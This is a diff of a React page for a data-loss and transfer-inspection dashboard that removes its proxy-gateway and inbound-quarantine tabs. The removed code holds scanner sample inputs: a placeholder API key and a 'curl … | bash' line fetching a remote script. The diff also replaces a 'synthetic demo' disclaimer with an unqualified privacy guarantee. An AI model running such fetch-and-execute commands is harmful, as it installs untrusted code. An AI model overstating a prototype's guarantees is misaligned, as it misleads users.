@@ -18,14 +18,11 @@ import {
   type TransferAttemptRow,
   type FileInspectionResultData,
   type FileInspectionMatch,
-  type ProxyInspectionResultData,
-  type IncomingInspectionResultData,
   type InspectionHistoryRow,
-  type IncomingHistoryRow,
 } from '../api/client';
-import { RiskBadge, DemoNotice, PageHeader, Section } from '../components/ui';
+import { RiskBadge, SecurityNotice, PageHeader, Section } from '../components/ui';
 
-type ActiveTab = 'inspector' | 'policies' | 'attempts' | 'proxy' | 'incoming' | 'history';
+type ActiveTab = 'inspector' | 'policies' | 'attempts' | 'history';
 
 interface SampleFilePreset {
   name: string;
@@ -126,22 +123,6 @@ export function DataGuard() {
   const [reviewNote, setReviewNote] = useState('');
   const [reviewSubmitting, setReviewSubmitting] = useState(false);
 
-  // ── Proxy State ────────────────────────────────────────────────────────────
-  const proxyFilename = 'outbound_payload.json';
-  const [proxyDestination, setProxyDestination] = useState('api.openai.com');
-  const [proxyContent, setProxyContent] = useState('{"auth": "sk-proj-abc12345678901234567890", "query": "summarize"}');
-  const [proxyEncrypted, setProxyEncrypted] = useState(true);
-  const [proxyInspecting, setProxyInspecting] = useState(false);
-  const [proxyResult, setProxyResult] = useState<ProxyInspectionResultData | null>(null);
-
-  // ── Incoming State ─────────────────────────────────────────────────────────
-  const [incomingFilename, setIncomingFilename] = useState('package-update.sh');
-  const [incomingOrigin, setIncomingOrigin] = useState('http://external-mirror.net');
-  const [incomingContent, setIncomingContent] = useState('#!/bin/bash\ncurl -s http://unverified-repo.org/setup.sh | bash\n');
-  const [incomingInspecting, setIncomingInspecting] = useState(false);
-  const [incomingResult, setIncomingResult] = useState<IncomingInspectionResultData | null>(null);
-  const [incomingHistory, setIncomingHistory] = useState<IncomingHistoryRow[]>([]);
-
   // ── History State ──────────────────────────────────────────────────────────
   const [history, setHistory] = useState<InspectionHistoryRow[]>([]);
 
@@ -153,12 +134,11 @@ export function DataGuard() {
   async function loadAll() {
     setError(null);
     try {
-      const [ov, rl, at, hi, inHi] = await Promise.all([
+      const [ov, rl, at, hi] = await Promise.all([
         api.dataGuardOverview().catch(() => null),
         api.dataSharingRules().catch(() => null),
         api.transferAttempts().catch(() => null),
         api.inspectionHistory().catch(() => null),
-        api.incomingHistory().catch(() => null),
       ]);
 
       if (ov) setOverview(ov.stats);
@@ -169,7 +149,6 @@ export function DataGuard() {
       }
       if (at) setAttempts(at.attempts);
       if (hi) setHistory(hi.inspections);
-      if (inHi) setIncomingHistory(inHi.inspections);
     } catch (err: any) {
       setError(err?.message || 'Failed to load Data Guard information.');
     }
@@ -215,51 +194,6 @@ export function DataGuard() {
       setError(err?.message || 'Inspection failed.');
     } finally {
       setInspecting(false);
-    }
-  }
-
-  // Run proxy inspection
-  async function handleInspectProxy() {
-    if (!proxyContent.trim() || !proxyDestination.trim()) return;
-    setProxyInspecting(true);
-    try {
-      const res = await api.inspectProxy({
-        filename: proxyFilename,
-        content: proxyContent,
-        destination: proxyDestination,
-        isEncrypted: proxyEncrypted,
-      });
-      setProxyResult(res.proxyInspection);
-      const ov = await api.dataGuardOverview();
-      setOverview(ov.stats);
-    } catch (err: any) {
-      setError(err?.message || 'Proxy inspection failed.');
-    } finally {
-      setProxyInspecting(false);
-    }
-  }
-
-  // Run incoming inspection
-  async function handleInspectIncoming() {
-    if (!incomingFilename.trim() || !incomingContent.trim()) return;
-    setIncomingInspecting(true);
-    try {
-      const res = await api.inspectIncoming({
-        filename: incomingFilename,
-        content: incomingContent,
-        sourceOrigin: incomingOrigin,
-      });
-      setIncomingResult(res.result);
-      const [ov, inHi] = await Promise.all([
-        api.dataGuardOverview(),
-        api.incomingHistory(),
-      ]);
-      setOverview(ov.stats);
-      setIncomingHistory(inHi.inspections);
-    } catch (err: any) {
-      setError(err?.message || 'Incoming inspection failed.');
-    } finally {
-      setIncomingInspecting(false);
     }
   }
 
@@ -323,7 +257,7 @@ export function DataGuard() {
     <div className="page-container animate-fade-in" id="main-content">
       <PageHeader
         title="Data Guard & Transfer Assurance"
-        subtitle="Configurable sharing policies, pre-transfer file inspection, proxy gateway analysis, and non-punitive compliance tracking."
+        subtitle="Configurable sharing policies, pre-transfer file inspection, repeated attempt compliance tracking, and audit history."
       >
         <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
           <span className="badge badge-info" style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
@@ -335,7 +269,7 @@ export function DataGuard() {
         </div>
       </PageHeader>
 
-      <DemoNotice message="Prototype notice: File content is analyzed in-memory and discarded immediately. No raw text, passwords, or tokens are persisted to disk or audit logs. All counts and alerts represent synthetic demo simulations." />
+      <SecurityNotice message="Privacy & Safety Guarantee: File content is analyzed strictly in-memory and discarded immediately. No raw file text, passwords, or tokens are persisted to disk or audit logs." />
 
       {error && (
         <div className="banner banner-error" style={{ marginBottom: '16px' }}>
@@ -391,20 +325,6 @@ export function DataGuard() {
           onClick={() => setActiveTab('attempts')}
         >
           ⚠️ Repeat Attempts ({attempts.filter((a: TransferAttemptRow) => a.flagged_for_review === 1).length} Flagged)
-        </button>
-        <button
-          type="button"
-          className={`tab-btn ${activeTab === 'proxy' ? 'active' : ''}`}
-          onClick={() => setActiveTab('proxy')}
-        >
-          🌐 Proxy Gateway Layer
-        </button>
-        <button
-          type="button"
-          className={`tab-btn ${activeTab === 'incoming' ? 'active' : ''}`}
-          onClick={() => setActiveTab('incoming')}
-        >
-          📥 Inbound Quarantine ({incomingHistory.length})
         </button>
         <button
           type="button"
@@ -1049,276 +969,8 @@ export function DataGuard() {
             )}
           </Section>
         </div>
-      )}
-
-      {/* ──────────────────────────────────────────────────────────────────────────
-          TAB 4: PROXY & GATEWAY INSPECTION LAYER
-          ────────────────────────────────────────────────────────────────────────── */}
-      {activeTab === 'proxy' && (
-        <div className="animate-fade-in">
-          <Section
-            title="Proxy / Gateway Outbound Inspection Layer"
-            description="Simulated second-layer inspection checking outbound traffic at the network gateway. Transparently displays network boundaries: unencrypted or decrypted TLS vs encrypted payloads."
-          >
-            <div className="grid grid-2" style={{ gap: '24px' }}>
-              <div className="card" style={{ padding: '20px' }}>
-                <h3 style={{ fontSize: '1rem', marginBottom: '14px' }}>🌐 Simulated Gateway Inspection</h3>
-
-                <div style={{ marginBottom: '12px' }}>
-                  <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '4px' }}>Destination Domain (SNI)</label>
-                  <input
-                    type="text"
-                    className="input"
-                    style={{ width: '100%' }}
-                    value={proxyDestination}
-                    onChange={(e) => setProxyDestination(e.target.value)}
-                  />
-                </div>
-
-                <div style={{ marginBottom: '14px' }}>
-                  <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '0.85rem', cursor: 'pointer' }}>
-                    <input
-                      type="checkbox"
-                      checked={proxyEncrypted}
-                      onChange={(e) => setProxyEncrypted(e.target.checked)}
-                    />
-                    <span>Standard Encrypted TLS (HTTPS) — No Enterprise Decryption</span>
-                  </label>
-                  <span style={{ fontSize: '0.75rem', color: 'var(--color-muted)', display: 'block', marginTop: '2px' }}>
-                    Uncheck to simulate authorized TLS interception (Enterprise MITM CA).
-                  </span>
-                </div>
-
-                <div style={{ marginBottom: '14px' }}>
-                  <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '4px' }}>Simulated Gateway Payload</label>
-                  <textarea
-                    rows={6}
-                    className="input"
-                    style={{ width: '100%', fontFamily: 'monospace', fontSize: '0.82rem' }}
-                    value={proxyContent}
-                    onChange={(e) => setProxyContent(e.target.value)}
-                  />
-                </div>
-
-                <button
-                  type="button"
-                  className="btn btn-primary"
-                  onClick={handleInspectProxy}
-                  disabled={proxyInspecting}
-                  style={{ width: '100%' }}
-                >
-                  {proxyInspecting ? 'Simulating Proxy Inspection...' : 'Inspect via Network Gateway'}
-                </button>
-              </div>
-
-              <div className="card" style={{ padding: '20px' }}>
-                <h3 style={{ fontSize: '1rem', marginBottom: '14px' }}>Gateway Inspection Result</h3>
-
-                {!proxyResult ? (
-                  <div style={{ textAlign: 'center', padding: '36px 16px', color: 'var(--color-muted)' }}>
-                    <span>🌐 Run a gateway inspection to view TLS inspection boundaries.</span>
-                  </div>
-                ) : (
-                  <div>
-                    <div
-                      style={{
-                        padding: '12px 16px',
-                        borderRadius: '6px',
-                        marginBottom: '14px',
-                        background: proxyResult.canInspect ? 'rgba(59, 130, 246, 0.1)' : 'rgba(245, 158, 11, 0.1)',
-                        border: `1px solid ${proxyResult.canInspect ? 'var(--color-accent)' : 'var(--color-high)'}`,
-                      }}
-                    >
-                      <div style={{ fontWeight: 600, fontSize: '0.9rem', marginBottom: '4px' }}>
-                        {proxyResult.canInspect ? '✓ Gateway Content Inspection Active' : '⚠️ Gateway Payload Opaque (TLS Encrypted)'}
-                      </div>
-                      <p style={{ margin: 0, fontSize: '0.82rem' }}>{proxyResult.inspectionNote}</p>
-                    </div>
-
-                    <div style={{ marginBottom: '12px' }}>
-                      <span style={{ fontSize: '0.8rem', fontWeight: 600, color: 'var(--color-muted)', display: 'block', marginBottom: '2px' }}>
-                        Gateway Action:
-                      </span>
-                      <span className={`badge badge-${proxyResult.actionTaken === 'blocked' ? 'critical' : proxyResult.actionTaken === 'warned' ? 'high' : 'low'}`}>
-                        {proxyResult.actionTaken.toUpperCase()}
-                      </span>
-                    </div>
-
-                    <div style={{ borderTop: '1px solid var(--color-border)', paddingTop: '10px' }}>
-                      <span style={{ fontSize: '0.78rem', fontWeight: 600, color: 'var(--color-muted)', display: 'block', marginBottom: '2px' }}>
-                        What the Proxy Cannot Determine:
-                      </span>
-                      <p style={{ fontSize: '0.78rem', color: 'var(--color-muted)', margin: 0 }}>
-                        {proxyResult.limitation}
-                      </p>
-                    </div>
-                  </div>
-                )}
-              </div>
-            </div>
-          </Section>
-        </div>
-      )}
-
-      {/* ──────────────────────────────────────────────────────────────────────────
-          TAB 5: INBOUND TRAFFIC & QUARANTINE
-          ────────────────────────────────────────────────────────────────────────── */}
-      {activeTab === 'incoming' && (
-        <div className="animate-fade-in">
-          <Section
-            title="Inbound File Inspection & Quarantine"
-            description="Inspect incoming file transfers and downloaded packages for known risk signatures, dangerous extensions, and suspicious scripts. Suspicious files are automatically quarantined."
-          >
-            <div className="grid grid-2" style={{ gap: '24px', marginBottom: '24px' }}>
-              <div className="card" style={{ padding: '20px' }}>
-                <h3 style={{ fontSize: '1rem', marginBottom: '14px' }}>📥 Inspect Inbound Transfer</h3>
-
-                <div style={{ marginBottom: '12px' }}>
-                  <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '4px' }}>Inbound Filename</label>
-                  <input
-                    type="text"
-                    className="input"
-                    style={{ width: '100%' }}
-                    value={incomingFilename}
-                    onChange={(e) => setIncomingFilename(e.target.value)}
-                  />
-                </div>
-
-                <div style={{ marginBottom: '12px' }}>
-                  <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '4px' }}>Source Origin / URL</label>
-                  <input
-                    type="text"
-                    className="input"
-                    style={{ width: '100%' }}
-                    value={incomingOrigin}
-                    onChange={(e) => setIncomingOrigin(e.target.value)}
-                  />
-                </div>
-
-                <div style={{ marginBottom: '14px' }}>
-                  <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '4px' }}>File Content / Script</label>
-                  <textarea
-                    rows={6}
-                    className="input"
-                    style={{ width: '100%', fontFamily: 'monospace', fontSize: '0.82rem' }}
-                    value={incomingContent}
-                    onChange={(e) => setIncomingContent(e.target.value)}
-                  />
-                </div>
-
-                <button
-                  type="button"
-                  className="btn btn-primary"
-                  onClick={handleInspectIncoming}
-                  disabled={incomingInspecting}
-                  style={{ width: '100%' }}
-                >
-                  {incomingInspecting ? 'Scanning Inbound File...' : 'Scan Inbound File'}
-                </button>
-              </div>
-
-              <div className="card" style={{ padding: '20px' }}>
-                <h3 style={{ fontSize: '1rem', marginBottom: '14px' }}>Scan Result & Action</h3>
-
-                {!incomingResult ? (
-                  <div style={{ textAlign: 'center', padding: '36px 16px', color: 'var(--color-muted)' }}>
-                    <span>📥 Run an inbound scan to inspect for malware indicators and quarantine status.</span>
-                  </div>
-                ) : (
-                  <div>
-                    <div
-                      style={{
-                        padding: '12px 16px',
-                        borderRadius: '6px',
-                        marginBottom: '14px',
-                        background:
-                          incomingResult.actionTaken === 'blocked' ? 'rgba(239, 68, 68, 0.15)' :
-                          incomingResult.actionTaken === 'quarantined' ? 'rgba(245, 158, 11, 0.15)' :
-                          'rgba(34, 197, 94, 0.15)',
-                        border: `1px solid ${
-                          incomingResult.actionTaken === 'blocked' ? 'var(--color-critical)' :
-                          incomingResult.actionTaken === 'quarantined' ? 'var(--color-high)' :
-                          'var(--color-low)'
-                        }`,
-                      }}
-                    >
-                      <div style={{ fontWeight: 600, fontSize: '0.9rem', marginBottom: '4px' }}>
-                        Inbound Action: {incomingResult.actionTaken.toUpperCase()}
-                      </div>
-                      <p style={{ margin: 0, fontSize: '0.82rem' }}>{incomingResult.actionReason}</p>
-                    </div>
-
-                    <div style={{ marginBottom: '12px' }}>
-                      <span style={{ fontSize: '0.8rem', fontWeight: 600, color: 'var(--color-muted)', display: 'block', marginBottom: '4px' }}>
-                        Detected Risk Indicators ({incomingResult.detectedRisks.length}):
-                      </span>
-                      {incomingResult.detectedRisks.length === 0 ? (
-                        <span style={{ fontSize: '0.82rem', color: 'var(--color-muted)' }}>No indicators detected.</span>
-                      ) : (
-                        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
-                          {incomingResult.detectedRisks.map((r: string, i: number) => (
-                            <span key={i} className="badge badge-high" style={{ fontSize: '0.75rem', textAlign: 'left' }}>
-                              ⚠️ {r}
-                            </span>
-                          ))}
-                        </div>
-                      )}
-                    </div>
-                  </div>
-                )}
-              </div>
-            </div>
-
-            {/* Quarantine Log */}
-            <h4 style={{ fontSize: '0.95rem', marginBottom: '12px' }}>Quarantine & Inbound Inspection Log</h4>
-            <div className="card" style={{ overflowX: 'auto', padding: 0 }}>
-              <table className="table" style={{ width: '100%', borderCollapse: 'collapse' }}>
-                <thead>
-                  <tr style={{ borderBottom: '1px solid var(--color-border)', textAlign: 'left', fontSize: '0.8rem', color: 'var(--color-muted)' }}>
-                    <th style={{ padding: '10px 14px' }}>Time</th>
-                    <th style={{ padding: '10px 14px' }}>Filename</th>
-                    <th style={{ padding: '10px 14px' }}>Source Origin</th>
-                    <th style={{ padding: '10px 14px' }}>Action Taken</th>
-                    <th style={{ padding: '10px 14px' }}>Risk Level</th>
-                    <th style={{ padding: '10px 14px' }}>Indicators</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  {incomingHistory.length === 0 ? (
-                    <tr>
-                      <td colSpan={6} style={{ padding: '20px', textAlign: 'center', color: 'var(--color-muted)' }}>
-                        No inbound file inspections recorded.
-                      </td>
-                    </tr>
-                  ) : (
-                    incomingHistory.map((row: IncomingHistoryRow) => (
-                      <tr key={row.id} style={{ borderBottom: '1px solid var(--color-border)', fontSize: '0.82rem' }}>
-                        <td style={{ padding: '10px 14px', whiteSpace: 'nowrap' }}>{row.created_at}</td>
-                        <td style={{ padding: '10px 14px' }}><strong>{row.filename}</strong></td>
-                        <td style={{ padding: '10px 14px' }}>{row.source_origin}</td>
-                        <td style={{ padding: '10px 14px' }}>
-                          <span className={`badge badge-${row.action_taken === 'blocked' ? 'critical' : row.action_taken === 'quarantined' ? 'high' : 'low'}`}>
-                            {row.action_taken.toUpperCase()}
-                          </span>
-                        </td>
-                        <td style={{ padding: '10px 14px' }}>
-                          <RiskBadge level={row.risk_level as any} />
-                        </td>
-                        <td style={{ padding: '10px 14px' }}>
-                          {row.malware_indicators.join(', ') || 'None'}
-                        </td>
-                      </tr>
-                    ))
-                  )}
-                </tbody>
-              </table>
-            </div>
-          </Section>
-        </div>
-      )}
-
-      {/* ──────────────────────────────────────────────────────────────────────────
-          TAB 6: INSPECTION LOG
+      )}      {/* ──────────────────────────────────────────────────────────────────────────
+          TAB 4: INSPECTION LOG
           ────────────────────────────────────────────────────────────────────────── */}
       {activeTab === 'history' && (
         <div className="animate-fade-in">
